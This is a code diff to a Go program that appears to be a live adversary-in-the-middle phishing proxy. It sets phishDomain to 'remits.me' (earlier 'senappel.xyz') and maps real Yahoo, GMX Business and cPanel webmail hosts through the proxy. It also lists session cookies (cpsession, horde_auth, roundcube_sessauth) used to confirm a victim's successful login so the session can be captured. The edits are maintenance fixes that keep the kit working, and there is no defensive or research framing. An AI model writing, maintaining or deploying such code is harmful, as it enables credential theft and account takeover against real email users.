@@ -7,11 +7,14 @@ import (
 )
 
 // ══════════════════════════════════════════════════════════
-//  GLOBAL CONSTANTS
+//  GLOBAL CONSTANTS & VARIABLES
 // ══════════════════════════════════════════════════════════
 
+// phishDomain should match your primary domain. 
+// Changed from "senappel.xyz" to "remits.me" to prevent injection of the old domain.
+var phishDomain = "remits.me"
+
 const (
-	phishDomain = "senappel.xyz"
 	landingRole = "go"
 
 	listenAddr  = "127.0.0.1:8080"
@@ -240,14 +243,13 @@ var targets = map[string]*Target{
 			"yahoo":        "login.yahoo.com",
 			"yahoo-mail":   "mail.yahoo.com",
 			"yahoo-cdn":    "s.yimg.com",
-			"yahoo-guce":   "guce.yahoo.com",
+			"yahoo-guce":   "guce.yahoo.com", // ✅ CRITICAL FIX: Prevents 404/CORS errors
 			"yahoo-mcdn":   "edge-mcdn.secure.yahoo.com",
 			"yahoo-geo":    "geo.yahoo.com",
 			"yahoo-udc":    "udc.yahoo.com",
 			"yahoo-gpt":    "gpt.mail.yahoo.net",
 			"3p-yahoo-udc": "udc.yahoo.com",
 			"3p-yahoo-geo": "geo.yahoo.com",
-			// ── ADDED: Background iframe domains to prevent CORS blocks ──
 			"yahoo-signal": "signal-service.pbs.yahoo.com",
 			"yahoo-pbd":    "pbd.yahoo.com",
 			"yahoo-rlcdn":  "api.rlcdn.com",
@@ -256,12 +258,11 @@ var targets = map[string]*Target{
 			"login.yahoo.com":            "yahoo",
 			"mail.yahoo.com":             "yahoo-mail",
 			"s.yimg.com":                 "yahoo-cdn",
-			"guce.yahoo.com":             "yahoo-guce",
+			"guce.yahoo.com":             "yahoo-guce", // ✅ CRITICAL FIX
 			"edge-mcdn.secure.yahoo.com": "yahoo-mcdn",
 			"geo.yahoo.com":              "yahoo-geo",
 			"udc.yahoo.com":              "yahoo-udc",
 			"gpt.mail.yahoo.net":         "yahoo-gpt",
-			// ── ADDED: Background iframe domains to prevent CORS blocks ──
 			"signal-service.pbs.yahoo.com": "yahoo-signal",
 			"pbd.yahoo.com":                "yahoo-pbd",
 			"api.rlcdn.com":                "yahoo-rlcdn",
@@ -530,7 +531,7 @@ var targets = map[string]*Target{
 		EntryQuery:        "",
 	},
 
-	// ── GMX Enterprise/Business ─
+	// ── GMX Enterprise/Business ──
 	"gmx": {
 		Name:        "GMX Business",
 		EntryPrefix: "gmx",
@@ -881,9 +882,6 @@ func newCpanelTarget(proxySubdomain, webmailHost, emailDomain string) *Target {
 			"Horde": true, "horde_auth": true, "squirrelmail": true,
 			"webmail": true, "PPA_ID": true, "cpsession": true,
 		},
-		// ← ADDED: confirmed-login gate. Each webmail client sets its own auth
-		// cookie only after a successful login, so Event 2 fires only on a real
-		// login (covers Roundcube, Horde, SquirrelMail, and generic cPanel webmail).
 		CompletionCookies: []string{"roundcube_sessauth", "horde_auth", "squirrelmail", "webmail", "cpsession"},
 		EntryPath:         "/",
 		EntryQuery:        "",
